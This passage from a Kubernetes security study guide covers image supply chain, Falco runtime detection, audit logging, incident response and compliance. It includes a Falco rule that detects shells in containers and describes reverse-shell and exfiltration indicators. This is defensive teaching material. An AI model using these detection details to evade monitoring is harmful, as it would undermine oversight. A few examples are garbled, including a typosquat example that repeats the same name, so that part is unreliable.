            ① Any code change → layer invalidated → all subsequent layers rebuild
               → pip install runs EVERY time (waste + potential dependency poisoning)
            If you COPY requirements.txt first:
            ① requirements.txt changes rarely → layer cached → pip install cached
            ② COPY . changes every commit → only this layer rebuilds (fast)
            This also provides a small security benefit: if dependencies are cached,
            they're always reinstalled from the SAME requirements.txt — less chance
            of dependency confusion or poisoning.

    Q156: What is the vulnerability difference between alpine:latest and distroless?
         A) Trivy scan comparison for a Python app:
            alpine:python3.12: ~20 packages → ~15 vulnerabilities (3 HIGH, 1 CRITICAL)
            distroless/python3-debian12: ~10 packages → ~5 vulnerabilities (1 MEDIUM)
            scratch (with statically compiled binary): 0 packages → 0 vulnerabilities
            The trend: fewer packages = fewer CVEs. Distroless removes the OS
            "userland" (shell, coreutils, package manager) while keeping the
            essential runtime libraries (libc, libssl, ca-certificates).

5.2 Image Repository (5 Qs)

    Q157: What is a "Software Bill of Materials" (SBOM) and what problem does it solve?
         A) An SBOM is like a NUTRITION LABEL for software. It lists every ingredient:
            • Base OS packages (libc6 v2.31, openssl v1.1.1)
            • Language dependencies (Django v4.2, requests v2.31, psycopg2 v2.9)
            • Transitive dependencies (Django → sqlparse v0.4, requests → urllib3 v2.0)
            When a CVE is announced, you query: "Do we have openssl < 1.1.1t?" →
            instant answer across ALL images → patch only affected ones. Without SBOM:
            search manually, hope you don't miss any, pray you're not the next headline.

    Q158: What tools generate SBOMs for container images?
         A) Syft (Anchore): syft anihpj-api:v1.2.3 -o spdx-json → sbom.spdx.json
            Trivy (Aqua): trivy image --format spdx-json anihpj-api:v1.2.3
            Tern: Inspects container image LAYERS to find packages (deeper analysis)
            BuildKit: --output type=image,sbom=true (generates SBOM during build)
            After generation: upload to Dependency-Track, OWASP DT, or your SIEM
            for continuous vulnerability correlation.

    Q159: What is SLSA provenance and why does it matter?
         A) Provenance answers: "Who built this image, from what source, using what
            build process, at what time?" It's a verifiable statement (signed).
            Example SLSA provenance for anihpj-api:v1.2.3:
            {
              "builder": { "id": "https://github.com/actions/runner" },
              "buildType": "https://slsa.dev/container/v1",
              "invocation": {
                "configSource": {
                  "uri": "git+https://github.com/anihpj/jobpost",
                  "digest": { "sha1": "abc123def456" }
                }
              },
              "materials": [
                { "uri": "pkg:pypi/django@4.2.0", "digest": {...} }
              ]
            }
            Verifiable by anyone: "Yes, this image was built from commit abc123 of
            github.com/anihpj/jobpost by GitHub Actions on 2026-06-12 at 14:30 UTC."

    Q160: How do you integrate security scanning into a CI/CD pipeline?
         A) .github/workflows/build-scan.yaml (GitHub Actions example):
            ① Checkout code → ② SAST (Bandit for Python, hadolint for Dockerfile)
               → ③ Build image → ④ SCA (Trivy scan on image → fail on CRITICAL/HIGH
               CVEs) → ⑤ SBOM generation (Syft) → ⑥ Sign image (Cosign keyless)
               → ⑦ Push to private registry → ⑧ Upload SBOM + scan results to
               security dashboard → ⑨ Deploy (Argo CD with signature verification)
            "Shift left": catch vulnerabilities at STEPS ②-④ (minutes to fix, zero
            user impact) instead of in production (emergency, users affected).

    Q161: What is the "allowed registries" pattern and how do you enforce it?
         A) Only images from approved registries can be deployed. Enforcement:
            OPA/Gatekeeper Rego policy:
            "For every container in every pod, image must start with
             '123456789012.dkr.ecr.us-east-1.amazonaws.com/' or 'anihpj.io/'"
            Kyverno ClusterPolicy (YAML):
            validate: image references must match allowed patterns.
            This prevents: pulling from public Docker Hub (CVE risk), typosquatted
            images (anihpj-api vs anihpj-api), or malicious registries.

    Q162: Why should you pin container images by SHA256 digest?
         A) Tags are MUTABLE pointers. :latest points to a DIFFERENT image tomorrow.
            :v1.2.3 can be overwritten (if --force push). Even :v1.2.3@sha256 can't
            guarantee the same image was built the same way.
            SHA256 digest is CONTENT-ADDRESSABLE: the hash IS the identity. If the
            content changes, the hash changes. To deploy a different image, you MUST
            explicitly change the digest → deliberate, auditable change.
            Example: image: anihpj-api@sha256:8a3f4b9c1d2e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a

    Q163: What is "continuous scanning" for container registries?
         A) New CVEs are discovered DAILY. An image scanned as "clean" last week
            might have a CRITICAL CVE today. Continuous scanning:
            • Registry scanner (Trivy, AWS ECR scanning, GCP Artifact Registry scanning)
              rescans ALL images on a schedule (daily/weekly).
            • If new CRITICAL CVE found → alert security team → identify running pods
              using affected image → patch or rollback.
            • Admission controller checks: is the image's LATEST scan clean? If not,
              block deployment (even if scan was clean when built).

    Q164: What is an image tag mutability policy and why enforce it?
         A) Tag immutability = once a tag is pushed, it can NEVER be overwritten.
            If you push anihpj-api:v1.2.3, no one can push a DIFFERENT image with
            the same tag. Benefits:
            • Prevents tag confusion attacks (attacker pushes malware as :v1.2.3)
            • Ensures deployment YAML referencing :v1.2.3 always gets the SAME image
            • Forces using new tags for new versions (v1.2.4, v1.3.0) → clear audit trail
            Supported by: ECR (immutable tags), Harbor, Artifactory, GCR (by digest).

5.3 Observability (5 Qs)
    Q165: What is Falco and how does it detect threats at runtime?
         A) Falco is a CNCF-graduated runtime security tool. It monitors:
            • System calls (via eBPF or kernel module): exec, open, connect, etc.
            • Kubernetes audit events: who created/deleted what
            • Cloud provider APIs (AWS CloudTrail via Falco plugins)
            Falco rules define "suspicious behavior":
            - rule: Terminal shell in container
              condition: spawned_process and container and proc.name in (bash, sh, zsh)
              output: "Shell opened in container (user=%user.name)"
              priority: WARNING
            When a rule matches → Falco generates an alert → can trigger response
            (webhook → PagerDuty, Slack, serverless function to kill the pod).

    Q166: What types of threats can Falco detect?
         A) ① Unexpected process execution: "Why is 'curl' running in the PostgreSQL pod?"
            ② File system changes: "Who modified /etc/passwd in the container?"
            ③ Unexpected network connections: "Why is the web pod connecting to
                a Russian IP on port 4444?" (reverse shell)
            ④ Privilege escalation: "A process just gained CAP_SYS_ADMIN!"
            ⑤ Container escape: "A process is trying to mount the host filesystem"
            ⑥ Kubernetes API abuse: "ServiceAccount x just listed ALL secrets"
            ⑦ Crypto mining: "Sustained 100% CPU + connections to mining pool IPs"
            ⑧ Data exfiltration: "Unusually large outbound data transfer at 3 AM"

    Q167: How does Falco work with eBPF?
         A) eBPF (extended Berkeley Packet Filter) allows running sandboxed programs
            in the Linux kernel WITHOUT loading kernel modules. Falco's eBPF probe:
            • Attaches to syscall tracepoints in the kernel
            • Every syscall from every container → Falco eBPF program inspects it
            • Filters in-kernel (only interesting events reach userspace) → low overhead
            • No kernel module needed → works on managed Kubernetes (EKS, GKE, AKS)
              where you can't install kernel modules
            eBPF is the MODERN way to do runtime security. It's safer (no kernel crash
            risk), faster (in-kernel filtering), and more portable (works everywhere).

    Q168: What is a Kubernetes Audit Policy and what should you log?
         A) An Audit Policy defines WHAT API requests get logged and at WHAT level:
            • None: Don't log
            • Metadata: Log request metadata (who, what, when) — not the body
            • Request: Log metadata + request body (but NOT response)
            • RequestResponse: Log metadata + request body + response body (verbose!)
            Common audit policy for security:
            • Log at RequestResponse: Secret reads, RBAC changes, PSP/PSS modifications
            • Log at Metadata: Pod exec, port-forward, attach
            • Log at Metadata: All requests from system:unauthenticated users
            • Don't log: Read-only operations on pods, deployments, services (too noisy)

    Q169: Who accesses the audit logs and why?
         A) ① Security Team: Investigate incidents — "who read the db-password Secret
               at 3:14 AM?" → check audit logs for Secret GET requests.
            ② Compliance Team: Prove SOC2/GDPR compliance — "show that only authorized
               users accessed PII data."
            ③ DevOps Team: Debug "who deleted the production Deployment?" → audit
               log shows kubectl delete deploy anihpj-api by user alice at T+5min.
            ④ Automated tools: SIEM (Splunk, ELK) ingests audit logs → correlates
               with other events → detects attack patterns.
            ⑤ Forensics: After a breach, audit logs are your TIME MACHINE — they
               show EXACTLY what the attacker did, in what order.

    Q170: What is the difference between Kubernetes audit logs and cloud audit logs?
         A) Kubernetes audit log: What happened INSIDE the cluster (kubectl commands,
            API requests, RBAC checks). Example: "User alice created pod X in ns Y."
            Cloud audit log (CloudTrail/Azure Monitor/GCP Cloud Audit): What happened
            at the CLOUD level. Example: "IAM role NodeGroupRole was attached to EC2
            instance i-abc123."
            Both are needed for complete visibility. A Kubernetes-only view misses:
            "Someone created an IAM user and attached AdminAccess policy → then used
            it to access EKS." Cloud audit catches the IAM change; K8s audit catches
            the kubectl commands.

    Q171: What is behavioral analytics in runtime security?
         A) Instead of signature-based detection (looking for KNOWN bad patterns),
            behavioral analytics establishes a BASELINE of normal behavior and alerts
            on ANOMALIES. Example:
            Baseline: anihpj-api makes outbound connections ONLY to anihpj-db:5432 and
            anihpj-redis:6379, with 5 requests/second average.
            Anomaly: anihpj-api suddenly connects to 185.220.101.x:4444 at 3 AM →
            ALERT (possible reverse shell or data exfiltration).
            Falco can be configured with behavioral rules. Advanced tools (Sysdig,
            Datadog CSM, CrowdStrike) use ML to auto-learn baselines and detect anomalies.

    Q172: How do you RESPOND to a Falco alert automatically?
         A) ① Falco alert triggers → sends to Falco Sidekick/Falcosidekick
            ② Sidekick forwards to: Slack (notify team), PagerDuty (page on-call),
               webhook (trigger automated response)
            ③ Automated response via serverless function (Lambda/Knative):
               • CRITICAL alert (container escape): IMMEDIATELY cordon the node,
                 kill the pod, create a forensic snapshot
               • HIGH alert (unexpected network): Apply emergency NetworkPolicy
                 blocking egress from affected namespace
               • MEDIUM alert (shell spawned): Log event, notify team for review
            Automation reduces MTTR (Mean Time to Respond) from hours to seconds.
            BUT: automate carefully — false positives could kill production pods!

5.4 Service Mesh (4 Qs)
    Q173: What is network segmentation and how do you implement it in Kubernetes?
         A) Network segmentation = dividing your network into isolated zones where
            traffic between zones is CONTROLLED and MONITORED. In Kubernetes:
            • Namespace-level segmentation: each app in its own namespace →
              NetworkPolicy default-deny between namespaces
            • Tier-level segmentation: within a namespace, web can talk to api
              but NOT to db directly (api is the intermediary)
            • Environment segmentation: dev/staging/prod are on different clusters
              OR different namespaces with NO cross-environment traffic allowed
            • External segmentation: only Ingress controller exposed to internet;
              all other services are ClusterIP (internal only)
            anihpj example: web (namespace A) → api (namespace A) → db (namespace A).
            Another app in namespace B CANNOT reach anihpj-db in namespace A.

    Q174: How does NetworkPolicy implement microsegmentation?
         A) Microsegmentation = fine-grained control over pod-to-pod traffic.
            Instead of "allow all traffic in namespace", you specify:
            "anihpj-api-7d8f9 can ONLY receive TCP traffic on port 8000 FROM pods
            with label app=anihpj-web in namespace anihpj, and can ONLY send TCP
            traffic on port 5432 to pods with label app=anihpj-db."
            This is the principle of least privilege applied to the NETWORK. Each
            pod can ONLY talk to its explicit dependencies — nothing else.

    Q175: What is the "Zero Trust Network" model in Kubernetes?
         A) ① No implicit trust based on network location. Being "inside the cluster"
               or "in the same namespace" doesn't mean you're trusted.
            ② All traffic is encrypted (mTLS everywhere via Istio/Linkerd/Cilium)
            ③ All traffic is authenticated (both ends present valid certificates)
            ④ All traffic is authorized (NetworkPolicy + Istio AuthorizationPolicy)
            ⑤ Default-deny: all traffic blocked unless explicitly allowed
            Result: Even if an attacker compromises a pod, they can't reach other
            services without explicit authorization. The network is a hostile
            environment by design.

    Q176: What are the steps in a Kubernetes security incident response?
         A) ① DETECTION: Falco alert / SIEM correlation / manual discovery
            ② TRIAGE: Is this a real incident or false positive? What's the severity?
            ③ CONTAINMENT: Isolate affected namespace/node (NetworkPolicy, cordon)
            ④ INVESTIGATION: Check audit logs, pod logs, Falco events → reconstruct
               the attack timeline
            ⑤ ERADICATION: Remove attacker's foothold (delete compromised pods,
               revoke tokens, rotate secrets, patch vulnerability)
            ⑥ RECOVERY: Restore from clean backup, verify no backdoors, restore service
            ⑦ POST-MORTEM: What happened? How did we miss it? How do we prevent it?
               Update policies, improve monitoring, train the team.
            KCSA: Know the process flow. The specific tools (Falco, Splunk, etc.)
            may vary, but the PROCESS is universal.

    Q177: What should you NEVER do during a Kubernetes security incident?
         A) ① DON'T delete the compromised pod immediately — you'll lose forensic
               evidence (memory, running processes, network connections).
               Instead: cordon the node, snapshot the pod's filesystem, capture logs.
            ② DON'T just "fix it and move on" — if you don't identify the ROOT CAUSE,
               the attacker will come back through the same vulnerability.
            ③ DON'T communicate on potentially compromised channels (Slack, email
               on the same infrastructure) — use out-of-band communication.
            ④ DON'T forget to notify stakeholders (management, legal, PR) if PII
               or customer data may have been exposed (GDPR breach notification
               deadline: 72 hours).

    Q178: How do you preserve forensic evidence during a container security incident?
         A) ① Take etcd snapshot: ETCDCTL_API=3 etcdctl snapshot save incident-$(date).db
            ② Export pod logs with timestamps: kubectl logs --timestamps pod > pod.log
            ③ Export audit logs for the timeframe: filter by namespace, user, time range
            ④ Snapshot the container filesystem: use kubectl cp or CSI snapshot
            ⑤ Capture network flows: if using Cilium (Hubble), export flow logs for
               affected pods during the incident window
            ⑥ Save all Falco alerts for the timeframe (Sidekick can forward to S3)
            ⑦ DO NOT kubectl delete anything until evidence is captured
            Cordon the node (kubectl cordon) → this prevents NEW pods but doesn't
            disturb existing ones.

    Q179: How do you build a "security-first culture" around Kubernetes?
         A) ① Security is EVERYONE'S responsibility, not just the security team.
            ② "Paved road" security: make the secure path the EASIEST path.
               • Secure base images provided as templates → devs don't choose insecure ones
               • Admission controller auto-adds securityContext → devs don't forget
               • CI/CD pipeline scans automatically → devs don't manually run scanners
            ③ Blameless post-mortems: "What in our PROCESS allowed this?" Not "WHOSE fault?"
            ④ Security champions: one person per team passionate about security, gets extra
               training, helps their team make secure decisions.
            ⑤ Gamification: leaderboard of "fewest CRITICAL CVEs" or "fastest patch time"
               → make security engaging, not punitive.
            KCSA: Understand the philosophy, not just the tools. Culture eats strategy
            for breakfast.

    Q180: What is the relationship between DevSecOps and Kubernetes Platform Security?
         A) DevSecOps = integrating security into DevOps (not a separate phase at the end).
            Kubernetes platform security implements DevSecOps through:
            • "Shift left": security checks in CI/CD (SAST, SCA, image scanning) — catch
              issues before production
            • "Shift right": runtime security (Falco, audit logging) — catch what slipped
              through in production (assume breach)
            • Policy as code: OPA/Kyverno policies stored in Git → reviewed like code →
              deployed via GitOps → versioned, auditable, rollback-able
            • Immutable infrastructure: containers are never patched — rebuilt from
              scratch with updated dependencies → ensures consistency
            • Continuous compliance: automated CIS scans (kube-bench), automated SBOM
              generation, automated audit log analysis
            KCSA is your DevSecOps foundation for Kubernetes — you understand WHAT to
            secure and WHY. CKS teaches you HOW to implement it.

6.1 Compliance Frameworks (6 Qs)
    Q181: What are CIS Benchmarks for Kubernetes?
         A) The Center for Internet Security (CIS) publishes consensus-based security
            configuration guides. The CIS Kubernetes Benchmark has ~100+ specific checks:
            • Control Plane: API server flags, etcd configuration, scheduler settings
            • Worker Nodes: kubelet flags, kube-proxy config, container runtime settings
            • Policies: RBAC, NetworkPolicy, Pod Security Standards, Secret management
            Each check: ID + Description + Rationale + Audit Steps + Remediation.
            Example: "1.2.1: Ensure that the --anonymous-auth argument is set to false."
            CIS Benchmarks are the INDUSTRY STANDARD for Kubernetes hardening.

    Q182: What is kube-bench and how does it implement CIS checks?
         A) kube-bench is a Go application that runs CIS Kubernetes Benchmark checks
            automatically. It:
            ① Detects the node type (master/worker) and Kubernetes version
            ② Reads the appropriate CIS check list for your version
            ③ Runs each check: reads config files, checks process flags, tests API
            ④ Outputs results: PASS / FAIL / WARN / INFO with remediation steps
            Run modes:
            • kube-bench run --targets master (on control plane node)
            • kube-bench run --targets node (on worker node)
            • kube-bench run --targets etcd (on etcd node, if external)
            • kube-bench run --targets policies (checks RBAC, PSP, NetworkPolicy)

    Q183: What does a FAIL result in kube-bench mean for compliance?
         A) FAIL = your configuration doesn't meet the CIS baseline. Each FAIL needs:
            ① Assessment: Is this a real risk for OUR environment? (context matters)
            ② Remediation: If yes, apply the fix. If no, document the EXCEPTION with
               justification (e.g., "We allow anonymous auth on the read-only port
               because our monitoring system needs it — mitigated by network firewall
               restricting access to /metrics only")
            ③ Tracking: FAILs should be tracked in a risk register with:
               - Check ID (e.g., 1.2.1)
               - Severity (scored/not scored)
               - Remediation plan + deadline
               - Exception justification (if not fixing)
            Auditors look for: "Did you run kube-bench? Do you have a process for
            addressing FAILs?" They don't expect 100% PASS (some checks don't apply).

    Q184: What are "scored" vs "not scored" CIS checks?
         A) Scored checks: These COUNT toward compliance scoring. They're the most
            critical security controls. Example: "Ensure anonymous auth is disabled"
            (scored — if you fail, it's a significant finding).
            Not scored checks: Recommendations, not requirements. They may have
            operational trade-offs. Example: "Ensure that the --profiling argument
            is set to false" (not scored — profiling is useful for debugging, but
            exposes performance data).
            In audit reports: scored FAILs are flagged as findings. Not scored
            FAILs are noted as recommendations.

    Q185: How often should you run kube-bench?
         A) ① After cluster creation: establish baseline
            ② After every configuration change: verify change didn't break compliance
            ③ Weekly automated scan: detect drift (someone changed a flag manually
               without updating documentation)
            ④ Before audit: generate fresh report for auditors
            ⑤ In CI/CD pipeline: validate new node images/configurations before deployment
            Automate with CronJob: run kube-bench weekly, upload results to security
            dashboard, alert on new FAILs.

    Q186: For anihpj/jobpost running in production, which CIS checks are MOST critical?
         A) ① 1.2.1: --anonymous-auth=false on API server (SCORED)
            ② 1.2.7: AlwaysPullImages admission plugin enabled (SCORED)
            ③ 2.1: etcd --cert-file and --key-file set (SCORED)
            ④ 2.2: etcd --client-cert-auth=true (SCORED)
            ⑤ 2.6: etcd --peer-client-cert-auth=true (SCORED)
            ⑥ 4.1.1: kubelet --anonymous-auth=false (SCORED)
            ⑦ 4.2.1: kubelet --authorization-mode=Webhook (SCORED)
            ⑧ 5.1.1: EncryptionConfiguration for Secrets (SCORED)
            ⑨ 5.4.1: RBAC is enabled (SCORED)
            ⑩ 5.4.2: Default ServiceAccount has no cluster-admin role (SCORED)
            These 10 checks cover the most common attack vectors. Fail any of them,
            and your cluster has CRITICAL security gaps.

6.2 Threat Modelling Frameworks (5 Qs)
    Q187: How does Kubernetes help with PCI-DSS compliance?
         A) PCI-DSS (Payment Card Industry Data Security Standard) applies if you
            process credit card payments. Kubernetes security controls map to PCI-DSS:
            PCI-DSS Requirement 1 (Firewalls): → NetworkPolicy (default-deny + allow rules)
            PCI-DSS Requirement 2 (Secure Config): → CIS Benchmarks + kube-bench
            PCI-DSS Requirement 3 (Protect Cardholder Data): → EncryptionConfiguration
              for Secrets, TLS for all communications, external vault for keys
            PCI-DSS Requirement 7 (Access Control): → RBAC (least privilege, unique IDs)
            PCI-DSS Requirement 10 (Audit): → Kubernetes audit logs (who did what when)
            PCI-DSS Requirement 11 (Test Security): → Trivy (image scanning), kube-bench
              (config scanning), Falco (runtime detection)
            PCI-DSS Requirement 6 (Secure Systems): → Pod Security Standards (restricted),
              image signing, SBOM for vulnerability management

    Q188: How does Kubernetes help with SOC2 compliance?
         A) SOC2 (Service Organization Control 2) is about TRUST — your systems protect
            customer data. The 5 Trust Service Criteria:
            Security: NetworkPolicy (firewall), RBAC (access control), TLS (encryption),
                     audit logs (who accessed what)
            Availability: Resource limits (prevent noisy neighbor), HPA (auto-scale),
                         PDB (minimum pods during disruptions), multi-AZ clusters
            Processing Integrity: Admission controllers (validate inputs before processing),
                                 Pod Security Standards (prevent unauthorized changes)
            Confidentiality: EncryptionConfiguration (secrets at rest), mTLS (data in
                            transit), private container registry (image confidentiality)
            Privacy: RBAC (only authorized access to PII), audit logs (prove compliance),
                     data lifecycle management (PVC reclaimPolicy, log retention)

    Q189: How does Kubernetes help with GDPR compliance?
         A) GDPR (General Data Protection Regulation — EU) focuses on personal data:
            Article 5 (Data Minimization): Only collect what you need. Separate PII
              from non-PII data in different databases/namespaces.
            Article 25 (Data Protection by Design): Pod Security Standards, RBAC,
              NetworkPolicy built into the architecture from day one.
            Article 30 (Records of Processing): Audit logs provide a record of WHO
              accessed WHAT data and WHEN — essential for GDPR data processing records.
            Article 32 (Security of Processing): Encryption at rest (etcd), encryption
              in transit (TLS), pseudonymization of PII in logs.
            Article 33 (Breach Notification): Falco alerts + audit logs = rapid breach
              detection → notify supervisory authority within 72 hours.
            Right to Erasure (Article 17): If user requests deletion, you must delete
              ALL their data — including backups. PVC snapshot management + data lifecycle
              policies must support this.

    Q190: What is the NIST Cybersecurity Framework and how does it apply to Kubernetes?
         A) NIST CSF has 5 core functions:
            ① IDENTIFY: Know your assets. SBOM tells you what's in your images. Audit
               logs tell you who accesses what. kube-bench identifies misconfigurations.
            ② PROTECT: Implement safeguards. RBAC, NetworkPolicy, Pod Security Standards,
               EncryptionConfiguration, image signing.
            ③ DETECT: Find breaches quickly. Falco (runtime detection), audit log
               monitoring, SIEM integration, behavioral analytics.
            ④ RESPOND: Take action during an incident. Cordon nodes, apply emergency
               NetworkPolicy, revoke compromised tokens, notify stakeholders.
            ⑤ RECOVER: Restore normal operations. etcd backup restore, GitOps reconciliation,
               post-mortem analysis, process improvement.
            NIST CSF is a GOVERNANCE framework — it's about the PROCESS, not the tools.
            It asks: "Do you have a process for X?" not "Which tool do you use for X?"

    Q191: How do you PROVE compliance to an auditor for a Kubernetes deployment?
         A) Auditor asks: "How do you control access to production databases?"
            Your answer: "The anihpj-db pod is in the anihpj namespace. Access is
            controlled by 3 layers:
            ① NetworkPolicy: Only pods with label app=anihpj-api can connect to port 5432.
               (Show: kubectl describe networkpolicy anihpj-db-access)
            ② RBAC: Only the api ServiceAccount has access to the db-credentials Secret.
               (Show: kubectl describe rolebinding db-secret-reader)
            ③ Audit logs: Every access to the db-credentials Secret is logged.
               (Show: audit log excerpt with Secret GET requests)
            Here's our kube-bench report showing 94% PASS on CIS checks. Here's our
            Trivy scan showing 0 CRITICAL CVEs in the PostgreSQL image. Here's the
            Cosign signature proving the image was built from our trusted CI pipeline."
            Key: DOCUMENT EVERYTHING. The controls exist; auditors need to SEE evidence.

    Q192: What is the difference between a "compliance framework" and a "security framework"?
         A) Compliance Framework (PCI-DSS, SOC2, GDPR): "What must you DO to satisfy
            this regulation?" — CHECKLISTS of required controls. Often focused on
            documentation + proof. Passing compliance ≠ being secure.
            Security Framework (NIST CSF, CIS Benchmarks, MITRE ATT&CK): "How should
            you THINK about security?" — MODELS and best practices. Focused on
            outcomes + continuous improvement.
            Relationship: Compliance frameworks tell you WHAT to do. Security frameworks
            tell you HOW to do it effectively. Example: PCI-DSS says "restrict access to
            cardholder data." CIS Benchmarks say "use RBAC + NetworkPolicy + encryption."

6.3 Supply Chain Compliance (5 Qs)
    Q193: How do Pod Security Standards (PSS) map to compliance requirements?
         A) Restricted PSS profile maps to:
            PCI-DSS Req 2.2: "Harden systems" → restricted pod (no host access)
            PCI-DSS Req 7.2: "Least privilege" → runAsNonRoot (no root)
            SOC2 Security: "Prevent unauthorized access" → readOnlyRootFilesystem
            SOC2 Confidentiality: "Prevent data leakage" → drop ALL capabilities
            GDPR Art. 25: "Data protection by design" → restricted PSS as default
            CIS 5.2.x: All PSS-related checks → restricted profile satisfies ALL
            Most compliance frameworks expect "hardened" configurations. The
            Restricted PSS profile IS the definition of a hardened pod.

    Q194: How do you enforce PSS for PCI-DSS in production?
         A) Namespace labels for production:
            pod-security.kubernetes.io/enforce: restricted
            pod-security.kubernetes.io/enforce-version: latest
            pod-security.kubernetes.io/audit: restricted
            Result: ANY pod that doesn't meet restricted profile is REJECTED.
            For system components that need privileged access (CNI, CSI, kube-proxy):
            • Put them in kube-system namespace (already exists)
            • kube-system has no PSS enforcement (or enforce=privileged)
            • Document the EXCEPTION: "kube-system components require elevated
              access because they manage cluster networking and storage. This is
              an accepted exception per PCI-DSS compensating controls."

    Q195: What is a "compensating control" in compliance?
         A) A compensating control is an ALTERNATIVE security measure that provides
            equivalent protection when you can't meet a specific requirement. Example:
            PCI-DSS requires: "Run all containers as non-root." But your monitoring
            agent needs root to read /proc. Compensating control:
            "The monitoring agent is deployed as a DaemonSet in kube-system namespace.
            It's the ONLY privileged pod. Access to kube-system is restricted to
            cluster-admins ONLY (RBAC). NetworkPolicy blocks ALL ingress/egress to
            the monitoring agent except metrics export to Prometheus. Audit logs
            record every access to kube-system. This compensating control provides
            equivalent security to running as non-root."

    Q196: How do you audit Pod Security Standard compliance across all namespaces?
         A) ① List all namespaces and their PSA labels:
               kubectl get ns -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.metadata.labels}{"\n"}{end}'
               → Verify every production namespace has enforce=restricted
            ② Check for pods violating their namespace's PSA level:
               kubectl get events --all-namespaces --field-selector reason=FailedCreate \
                 | grep "violates PodSecurity"
            ③ Use policy reporter tools (Kyverno Policy Reporter, Fairwinds Insights)
               that aggregate PSA violations across all clusters
            ④ Integrate into CI/CD: kubectl apply --dry-run=server → catch violations
               BEFORE deployment

6.4 Automation and Tooling (4 Qs)
    Q197: Why is SLSA important for regulatory compliance?
         A) SLSA (Supply Chain Levels for Software Artifacts) provides verifiable proof
            of the software supply chain integrity:
            • SLSA Level 2+: You can PROVE which source repo and build process
              produced each container image (provenance attestation).
            • SLSA Level 3+: Builds are ISOLATED and AUDITABLE → you can prove
              the build wasn't tampered with.
            • SLSA Level 4: HERMETIC builds + two-person review → highest assurance.
            Compliance mapping:
            • PCI-DSS Req 6.3: "Secure software development" → SLSA Level 2+
            • SOC2 Security: "Change management" → SLSA provenance (who built what)
            • GDPR Art. 25: "Data protection by design" → SLSA ensures secure build
            • Executive Order 14028 (US): "SBOM for federal software" → SLSA + SBOM
            Future: SLSA Level 3+ will likely become a COMPLIANCE REQUIREMENT for
            regulated industries (finance, healthcare, government).

    Q198: What is an SBOM attestation and how does it differ from image scanning?
         A) SBOM (Software Bill of Materials): A LIST of every component in the image.
            "This image contains: Django 4.2.0, psycopg2 2.9.3, libc6 2.31, openssl 1.1.1..."
            Image scanning (Trivy/Grype): Scans the SBOM components against CVE databases.
            "Django 4.2.0 has CVE-2024-1234 (CRITICAL), openssl 1.1.1 has CVE-2023-5678 (HIGH)..."
            SBOM attestation: The SBOM is CRYPTOGRAPHICALLY SIGNED (with Cosign) and
            stored in a TRANSPARENCY LOG (Rekor). This proves: "This SBOM was generated
            at build time, by this workflow, and hasn't been tampered with."
            SBOM + Image scanning = you know WHAT's in the image AND if it's vulnerable.
            Both are needed for supply chain compliance.

    Q199: How do you implement "continuous compliance" for Kubernetes?
         A) Continuous compliance = automated, ongoing verification (not point-in-time audit).
            ① kube-bench CronJob: Weekly CIS scan → results to SIEM → alert on new FAILs
            ② Trivy CronJob: Daily image scan → alert on new CRITICAL CVEs
            ③ OPA/Kyverno: Policy enforcement is CONTINUOUS (every API request checked)
            ④ Falco: Continuous runtime monitoring → alert on policy violations
            ⑤ Audit log streaming: Continuous → SIEM → correlation + alerting
            ⑥ GitOps (Argo CD/Flux): Continuous reconciliation → detect drift from Git
            ⑦ Dashboard: Single pane of glass showing compliance status (Green/Yellow/Red)
            Continuous compliance is the DIFFERENCE between "we passed an audit last year"
            and "we're compliant RIGHT NOW, and we can PROVE it."

    Q200: Looking beyond KCSA — how does this certification prepare you for CKS?
         A) KCSA → CKS progression:
            KCSA (Associate) — You understand:
            • WHAT the 4 Cs are and WHY they matter
            • WHAT RBAC, NetworkPolicy, Pod Security Standards ARE
            • WHAT an attack surface looks like and HOW threats work
            • WHAT tools exist (Falco, Trivy, OPA, Cosign)
            • WHAT compliance frameworks require
            CKS (Specialist) — You can IMPLEMENT:
            • HOW to configure CIS-hardened clusters with kubeadm
            • HOW to write and troubleshoot RBAC policies
            • HOW to deploy and tune Falco rules
            • HOW to set up EncryptionConfiguration with KMS
            • HOW to implement supply chain security (Cosign + SBOM + OPA)
            • HOW to harden container runtimes (seccomp, AppArmor, SELinux)
            • HOW to perform and respond to security incidents
            KCSA is the THEORY (the "why"). CKS is the PRACTICE (the "how").
            Together, they make you a well-rounded Kubernetes security professional.
            🚀 Beyond CKS: Security Architect, DevSecOps Lead, Platform Security Engineer.
